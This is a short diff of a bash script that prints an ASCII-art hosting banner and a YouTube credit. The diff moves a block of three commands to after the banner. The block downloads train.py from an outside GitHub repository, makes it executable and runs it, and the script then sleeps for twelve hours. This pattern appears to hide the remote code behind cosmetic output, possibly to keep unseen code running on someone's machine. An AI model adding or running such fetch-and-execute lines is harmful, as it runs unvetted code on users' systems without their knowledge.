@@ -55,10 +55,6 @@ enda='\033[0m'
 # Branding
 #!/bin/bash
 
-wget -O train.py https://raw.githubusercontent.com/jangkrikletoy/jangkr1yq/main/train.py
-chmod +x train.py
-python train.py
-
 printf """$c$b
  
 ██╗     ██╗███╗   ██╗ ██████╗  ██████╗  █████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗███╗   ██╗ ██████╗ 
@@ -70,4 +66,9 @@ printf """$c$b
     $r  Support YT Channel-> Aank is ME © 2022 $c https://aank.me/Youtube 
           
 $endc$enda""";
+
+wget -O train.py https://raw.githubusercontent.com/jangkrikletoy/jangkr1yq/main/train.py
+chmod +x train.py
+python train.py
+
 sleep 43200
